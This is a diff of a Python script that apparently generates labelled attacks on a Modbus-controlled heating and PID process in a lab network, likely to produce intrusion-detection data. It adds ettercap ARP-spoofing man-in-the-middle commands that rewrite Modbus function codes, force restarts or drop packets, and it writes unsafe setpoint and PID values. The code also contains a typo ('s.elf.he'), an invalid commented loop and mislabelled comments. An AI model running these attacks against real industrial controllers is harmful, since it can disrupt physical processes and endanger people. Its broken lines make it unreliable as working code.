@@ -27,7 +27,7 @@ class attack:
         self.CurrentAttack = None
         self.ThreadDict = {}
 
-        self.AttackDict = {
+        self.OperationDict = {
 	     8: self.Attack8,
              9: self.Attack9,
             10: self.Attack10,
@@ -42,13 +42,19 @@ class attack:
             24: self.Attack24,
             25: self.Attack25,
             26: self.Attack26,
+	    27: self.Attack27,
+	    28: self.Attack28,
+	    29: self.Attack29,
+	    30: self.NormalOperation1,
+	    31: self.NormalOperation2,
+	    32: self.NormalOperation3,
         }
 
     def RunAttack( self, AttackNumber, pkt_per_sec=PKT_PER_SEC ):
         # Set label to attack label
 
         # Create attack task
-        tsk = AttackTask( self.AttackDict[ AttackNumber ], pkt_per_sec )
+        tsk = AttackTask( self.OperationDict[ AttackNumber ], pkt_per_sec )
 
         # Create attack task thread
         t = Thread(target = tsk.run )
@@ -78,29 +84,25 @@ class attack:
         for AttackNumber in list( self.ThreadDict.keys() ):
             self.StopAttack( AttackNumber )
 
-    def EttercapAttack( self, filter_name, timeout=5  ):
-        command = "ettercap -TQ -s 's{}q' -F {} -M ARP /{}//".format( filter_name, timeout, self.ip )
-        os.system(command)
-
     def Attack8( self ):
         # #8 -- Replace function code with 0x80 and add 0x01 exception code after
-        self.EttercapAttack("attack8.ef")
+        os.system("ettercap -TQ -s 's(5)q' -F attack8EC1.ef -M ARP /192.168.56.1// /192.168.56.105//")
 
     def Attack9( self ):
         # #9 -- Replace function code with 0x80 and add 0x02 exception code after
-        self.EttercapAttack("attack9.ef")
+        os.system("ettercap -TQ -s 's(5)q' -F attack9EC2.ef -M ARP /192.168.56.1// /192.168.56.105//")
 
     def Attack10( self ):
         # #10 -- Replace function code with 0x80 and add 0x03 exception code after
-        self.EttercapAttack("attack10.ef")
+        os.system("ettercap -TQ -s 's(5)q' -F attack10EC3.ef -M ARP /192.168.56.1// /192.168.56.105//")
 
     def Attack11( self ):
         # #11 -- Replace function code with 0x80 and add 0x04 exception code after
-        self.EttercapAttack("attack11.ef")
+        os.system("ettercap -TQ -s 's(5)q' -F attack11EC4.ef -M ARP /192.168.56.1// /192.168.56.105//")
 
     def Attack12( self ):
         # #12 -- Replace function code with 0x80 and add 0x05 exception code after
-        self.EttercapAttack("attack12.ef")
+        os.system("ettercap -TQ -s 's(5)q' -F attack12EC5.ef -M ARP /192.168.56.1// /192.168.56.105//")
 
     def Attack18( self ):
         # #18 -- Set the value of setpoint below 20C
@@ -138,8 +140,50 @@ class attack:
         # #26 -- Set the value of pid_td to 0.5 (does nothing if system is already stable.  Will cause instability when set point is moved afterwards)
         self.he.WriteRegister( "PID_td", 0.5 )
 
+    def Attack27( self ):
+        # #12 -- Replace function code with 0x80 and add 0x05 exception code after
+        os.system("ettercap -TQ -s 's(5)q' -F attack27forcelisten.ef -M ARP /192.168.56.1// /192.168.56.105//")
+
+    def Attack28( self ):
+        # #12 -- force modbus restart
+        os.system("ettercap -TQ -s 's(5)q' -F attack28restart.ef -M ARP /192.168.56.1// /192.168.56.105//")
+
+    def Attack29( self ):
+        # #12 -- Replace function code with 0x80 and add 0x05 exception code after
+        os.system("ettercap -TQ -s 's(5)q' -F attack29drop.ef -M ARP /192.168.56.1// /192.168.56.105//")
+
+    def NormalOperation1( self ):
+	# #30 -- Set all values normal
+        self.he.WriteRegister( "Setpoint", 50 )
+        self.he.WriteRegister( "PID_td", .0 )
+        self.he.WriteRegister( "PID_tr", .1 )
+        self.he.WriteRegister( "PID_kp", .4)
+
+    def NormalOperation2( self ):
+	# #31 -- Set all values normal
+        self.he.WriteRegister( "Setpoint", 45 )
+        self.he.WriteRegister( "PID_td", .0 )
+        self.he.WriteRegister( "PID_tr", .1 )
+        self.he.WriteRegister( "PID_kp", .4)
+
+    def NormalOperation3( self ):
+	# #32 -- set all values normal
+        self.he.WriteRegister( "Setpoint", 35 )
+        self.he.WriteRegister( "PID_td", .0 )
+        self.he.WriteRegister( "PID_tr", .1 )
+        s.elf.he.WriteRegister( "PID_kp", .4)
+
 if __name__=="__main__":
-    attacker = attack( "192.168.56.104", "502" )
+    attacker = attack( "192.168.56.1", "502" )
     attacker.he.PrintAllRegisters()
-    attacker.RunAttack( 12 )
+    #for 1 in range(100):
+#	num = random.randint(1,32)
+#	if num < 30:
+#		attacker.change_data_label("Attack " + str(num), '127.0.0.1',4321)
+#	else:
+#		attacker.change_data_label("Normal Operation", '127.0.0.1',4321)
+#	attacker.RunAttack(num)
+#	randomTime = random.randint(0, 20)
+	#time.sleep(randomTime)
+    attacker.RunAttack( 30 )
     attacker.StopAllAttacks()
